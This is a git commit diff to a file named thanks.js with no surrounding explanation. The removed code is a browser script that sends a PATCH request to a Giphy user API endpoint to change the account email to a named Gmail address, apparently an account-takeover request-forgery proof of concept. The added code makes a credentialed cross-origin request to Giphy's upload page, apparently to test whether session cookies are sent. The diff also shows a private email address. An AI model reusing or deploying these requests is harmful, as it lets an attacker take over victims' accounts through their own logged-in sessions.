3a0c1848c39810f2382f3874bf8b9be50d272bc0
naysser <77415898+naysser@users.noreply.github.com>
2021-08-19 02:24:12 +0200

    Update thanks.js

--- thanks.js
+++ thanks.js
@@ -1,20 +1,4 @@
-var url = "https://giphy.com/api/v1/users/38320143/";
-
 var xhr = new XMLHttpRequest();
-xhr.open("PATCH", url);
-
-xhr.setRequestHeader("Accept", "application/json");
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.setRequestHeader('Cookie', 'mycookie=cookie');
-
-xhr.onreadystatechange = function () {
-   if (xhr.readyState === 4) {
-      console.log(xhr.status);
-      console.log(xhr.responseText);
-   }};
-
-var data = `{
-  "email": nassreddine1b29@gmail.com
-}`;
-
-xhr.send(data);
+xhr.open('GET', 'https://giphy.com/upload/', true);
+xhr.withCredentials = true;
+xhr.send(null);
